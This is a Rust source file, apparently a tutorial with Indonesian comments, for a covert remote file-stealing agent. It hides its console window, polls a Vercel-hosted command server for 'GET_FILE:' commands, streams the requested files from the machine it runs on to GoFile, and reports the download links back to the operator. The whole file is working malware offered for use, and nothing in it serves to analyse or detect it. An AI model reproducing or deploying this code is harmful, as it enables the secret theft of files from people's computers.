#![windows_subsystem = "windows"] // 👻 Hide Console Window

use std::time::Duration;
use tokio::time::sleep;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::path::Path;
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};

// CONFIG
const API_URL: &str = "https://erzysh.vercel.app/api/ghost"; // Ganti domain lo
const DISCORD_LIMIT: u64 = 24 * 1024 * 1024; // 24MB buffer

#[derive(Deserialize)]
struct CommandResponse {
    messageId: Option<String>,
    command: Option<String>,
}

#[tokio::main]
async fn main() {
    let client = Client::new();

    loop {
        // 1. Poll Command
        match fetch_command(&client).await {
            Ok(Some((msg_id, cmd))) => {
                if cmd.starts_with("GET_FILE:") {
                    let path = cmd.trim_start_matches("GET_FILE:");
                    handle_file_request(&client, path, &msg_id).await;
                }
            }
            _ => {
                // Sleep dynamic: Kalau error/kosong, sleep lamaan dikit
                sleep(Duration::from_secs(5)).await;
            }
        }
        sleep(Duration::from_secs(2)).await;
    }
}

async fn fetch_command(client: &Client) -> Result<Option<(String, String)>, Box<dyn std::error::Error>> {
    let resp = client.get(API_URL).send().await?;
    if resp.status().is_success() {
        let data: CommandResponse = resp.json().await?;
        if let (Some(mid), Some(cmd)) = (data.messageId, data.command) {
            return Ok(Some((mid, cmd)));
        }
    }
    Ok(None)
}

async fn handle_file_request(client: &Client, path_str: &str, msg_id: &str) {
    let path = Path::new(path_str);
    if !path.exists() {
        report_result(client, msg_id, "Error: File not found on PC").await;
        return;
    }

    let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
    let link_result;

    if size < DISCORD_LIMIT {
        // Upload to Discord via Vercel Proxy (atau langsung ke Webhook kalau lo mau bypass)
        // Disini kita upload ke GoFile aja biar uniform kodenya, TAPI...
        // Kalau mau perfect, logic Discord upload harusnya ada di sini.
        // Untuk simplifikasi Tutorial ini, kita hajar GoFile semua dulu, 
        // KECUALI lo mau setup Discord Upload logic yang agak ribet multipart-nya.
        // Mari kita pakai GoFile (Guest) buat semua file dulu biar simple & reliable.
        link_result = upload_to_gofile(client, path_str).await;
    } else {
        link_result = upload_to_gofile(client, path_str).await;
    }

    match link_result {
        Ok(url) => report_result(client, msg_id, &url).await,
        Err(_) => report_result(client, msg_id, "Error: Upload failed").await,
    }
}

async fn upload_to_gofile(client: &Client, file_path: &str) -> Result<String, Box<dyn std::error::Error>> {
    // 1. Get Server
    let server_res: serde_json::Value = client.get("https://api.gofile.io/getServer")
        .send().await?.json().await?;
    let server = server_res["data"]["server"].as_str().unwrap_or("store1");
    
    // 2. Stream Upload
    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    
    let part = reqwest::multipart::Part::stream(file_body)
        .file_name(Path::new(file_path).file_name().unwrap().to_string_lossy().to_string());

    let form = reqwest::multipart::Form::new().part("file", part);

    let upload_res: serde_json::Value = client.post(format!("https://{}.gofile.io/uploadFile", server))
        .multipart(form)
        .send().await?
        .json().await?;

    // 3. Get Link
    if let Some(link) = upload_res["data"]["downloadPage"].as_str() {
        Ok(link.to_string())
    } else {
        Err("Gofile response invalid".into())
    }
}

async fn report_result(client: &Client, reply_to_id: &str, data: &str) {
    let _ = client.post(API_URL)
        .json(&json!({
            "action": "report_result",
            "replyToId": reply_to_id,
            "data": data
        }))
        .send().await;
}